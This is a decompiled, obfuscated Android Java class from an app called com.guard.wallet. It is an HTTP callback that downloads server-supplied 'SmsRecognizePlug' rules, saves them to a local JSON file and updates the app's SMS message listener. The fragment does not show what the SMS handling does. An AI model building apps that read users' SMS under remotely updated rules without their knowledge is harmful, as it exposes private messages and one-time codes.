package com.guard.wallet.http;

import a1.AbstractC0026q;
import android.util.Log;
import com.google.json.reflect.TypeToken;
import com.guard.wallet.MainApplication;
import com.guard.wallet.resp.ApiResult;
import com.guard.wallet.resp.SmsRecognizePlug;
import com.guard.wallet.utils.AbstractC0251g;
import com.guard.wallet.utils.AbstractC0252h;
import java.io.IOException;
import java.util.List;
import p0.InterfaceC0863e;
import p0.j0;
import p0.l0;
import p015s.C0897b;

/* renamed from: com.guard.wallet.http.z */
/* loaded from: classes.dex */
public final class C0221z implements InterfaceC0863e {
    @Override // p0.InterfaceC0863e
    /* renamed from: b */
    public final void mo389b(p0.e0 e0Var, IOException iOException) {
        AbstractC0026q.m186s("SmsRecognizePlugCallback", iOException);
        if (iOException instanceof C0897b) {
            return;
        }
        C0204i.m400c(e0Var.f1773c.f1777a.f1914h);
    }

    @Override // p0.InterfaceC0863e
    /* renamed from: d */
    public final void mo390d(p0.e0 e0Var, j0 j0Var) {
        C0204i.m400c(e0Var.f1773c.f1777a.f1914h);
        l0 l0Var = j0Var.f1835g;
        if (l0Var != null) {
            try {
                ApiResult apiResult = (ApiResult) AbstractC0252h.m699c(l0Var.m1269z(), new TypeToken<ApiResult<List<SmsRecognizePlug>>>() { // from class: com.guard.wallet.http.SmsRecognizePlugCallback$1
                });
                if (apiResult != null && apiResult.getSuccess().booleanValue() && apiResult.getData() != null && !((List) apiResult.getData()).isEmpty()) {
                    String m693N = AbstractC0252h.m693N(apiResult.getData());
                    AbstractC0251g.m633F((List) apiResult.getData());
                    if (!AbstractC0026q.m151B(m693N)) {
                        String i02 = AbstractC0251g.i0();
                        if (!AbstractC0026q.m151B(i02)) {
                            String concat = i02.concat("/smsRecognizePlugs.json");
                            Log.d("SmsRecognizePlugCallback", concat);
                            if (!AbstractC0026q.m190w(concat) ? AbstractC0026q.m179l(concat) : true) {
                                AbstractC0026q.m170U(concat, m693N);
                            }
                        }
                    }
                }
            } catch (Exception e2) {
                AbstractC0026q.m186s("SmsRecognizePlugCallback", e2);
            }
        }
        if (MainApplication.getInstance() != null && MainApplication.getInstance().getSmsMessageListener() != null) {
            MainApplication.getInstance().getSmsMessageListener().f2087b = 2;
        }
        j0Var.close();
    }
}
